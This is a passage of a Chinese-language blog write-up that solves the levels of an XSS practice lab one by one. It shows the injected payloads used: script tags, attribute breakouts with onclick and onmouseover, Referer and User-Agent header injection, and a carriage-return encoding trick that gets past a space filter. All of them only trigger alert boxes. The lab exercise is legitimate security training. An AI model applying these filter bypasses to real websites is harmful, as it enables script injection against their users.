<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181450629.png" alt="image-20231018145039598"></p>
<p>看得出来链接已经合法了但是但是http://在前面是无法执行JavaScript，给它放到最后面并且用//注释掉，在输入框内输入</p>
<p>成功通关！</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181456295.png" alt="image-20231018145610261"></p>

        <h1 id="level-10"   >
          <a href="#level-10" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-10" class="headerlink" title="level-10"></a>level-10</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181456893.png" alt="image-20231018145640803"></p>
<p>正常注入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181459235.png" alt="image-20231018145910204"></p>
<p>发现&lt;&gt;被转义，除了keyword外还有三个参数，尝试给三个参数传参</p>
<p><code>https://xssaq.com/yx/level10.php?keyword=1&amp;t_link=2&amp;t_history=3&amp;t_sort=4</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181501319.png" alt="image-20231018150128286"></p>
<p>发现只有t_sort接受了传参，要使用t_sort就得变换本身的hidden类型，把它改成其他类型button，注意双引号闭合</p>
<p>在URL上给keyword和t_sort传参</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=1&amp;t_sort=&quot;%20onclick=&quot;alert(1)</span><br></pre></td></tr></table></div></figure>

<p>再按F12把t_sort本身的hidden类型改成button</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181509704.png" alt="image-20231018150942673"></p>
<p>回车后画面中会出现一个按钮</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181510378.png" alt="image-20231018151029344"></p>
<p>点击按钮，成功通关！</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181512502.png" alt="image-20231018151257400"></p>

        <h1 id="level-11"   >
          <a href="#level-11" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-11" class="headerlink" title="level-11"></a>level-11</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181513216.png" alt="image-20231018151310174"></p>
<p>看起来和上一关差不多，直接查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181521543.png" alt="image-20231018152114489"></p>
<p> t_ref 已经有了值，而且是上一关通关的payload</p>
<p>正常传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181513433.png" alt="image-20231018151353399"></p>
<p>依然有&lt;&gt;的转义，但t_ref的值没了，类似的方法给另外四个参数也传参</p>
<p><code>?keyword=1&amp;t_link=2&amp;t_history=3&amp;t_sort=4&amp;t_ref=5</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181525332.png" alt="image-20231018152545257"></p>
<p>还是t_sort接受传参，但是t_ref没了，再用上一关的方法试试</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181536992.png" alt="image-20231018153640925"></p>
<p>双引号也被转义了，抓包看看</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181543511.png" alt="image-20231018154339455"></p>
<p> 可以看出ref 是 http 头中的 referer 属性，修改一下Referer的值为5</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181544146.png"></p>
<p>成功传入</p>
<p>从这里入手构造payload</p>
<p>可以在burpsuit里修改Referer的值，也可以直接在网页按F12里修改t_ref，同时把该参数的类型更改为button类型</p>
<p>传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181555383.png" alt="image-20231018155532291"></p>
<p>按一下按钮成功通关！</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181555057.png" alt="image-20231018155557988"></p>

        <h1 id="level-12"   >
          <a href="#level-12" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-12" class="headerlink" title="level-12"></a>level-12</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181557557.png" alt="image-20231018155728451"></p>
<p>直接查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181557368.png" alt="image-20231018155743325"></p>
<p>显然和上一关类似，只是t_ref换成了t_ua</p>
<p>直接F12修改t_ua的值，并且改变成button类型</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181559365.png" alt="image-20231018155914274"></p>
<p>点击按钮即可通关！</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181559187.png" alt="image-20231018155941032"></p>

        <h1 id="level-13"   >
          <a href="#level-13" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-13" class="headerlink" title="level-13"></a>level-13</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181601034.png" alt="image-20231018160150945"></p>
<p>查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181602428.png" alt="image-20231018160205370"></p>
<p>和前两关相同</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181604942.png" alt="image-20231018160421801"></p>

        <h1 id="level-16"   >
          <a href="#level-16" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-16" class="headerlink" title="level-16"></a>level-16</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181616731.png" alt="image-20231018161635493"></p>
<p>查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181617771.png" alt="image-20231018161705723"></p>
<p>和之前的不太一样，正常注入试试<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181705516.png" alt="image-20231018170503472"></p>
<p> script和/没了，试一下没有这两个的</p>
<p>传入“ onclick=”alert(1)</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181706816.png" alt="image-20231018170645786"></p>
<p>空格也没了</p>
<p>用回车代替空格绕过试试（回车、换行不支持在on事件中使用）</p>
<p>可以用：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src =x onerror=alert(111)&gt;</span><br></pre></td></tr></table></div></figure>

<p>要使用URL编码将回车符转换为%0d</p>
<p>所以传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%0dsrc=x%0donerror=alert(111)&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181713997.png" alt="image-20231018171337868"></p>

        <h1 id="level-17"   >
          <a href="#level-17" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-17" class="headerlink" title="level-17"></a>level-17</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310182107428.png" alt="image-20231018210758371"></p>
<p>（要使用flash才能显示出图片，不过也影响不大）</p>
<p>从url可以看出是要对arg01和arg02传参</p>
<p>查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310190912392.png" alt="image-20231019091245312"></p>
<p>修改一下arg01和arg02的值</p>
<p><code>?arg01=1&amp;arg02=2</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310190913772.png" alt="image-20231019091330739"></p>
<p>发现src的值发生了变化</p>
<p>这两个变量是互相拼接起来的，所以在输入arg02时在b之后加一个空格，当浏览器解析到b的时候就停止判断，然后将onclick看作另外一个属性。从而执行javascript语句。</p>
<p>执行</p>
<p><code>?arg01=a&amp;arg02=b%20onmouseover=alert(1)</code></p>
<p>(onclick不行，应该是因为加载不出图片无法点击，所以用不了这个事件)</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310190923882.png" alt="image-20231019092332845"></p>
</div></div></article></section><nav class="paginator"><div class="paginator-inner"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">13</div><div class="sidebar-ov-state-item__name">Archives</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PiDan-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v6.0.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>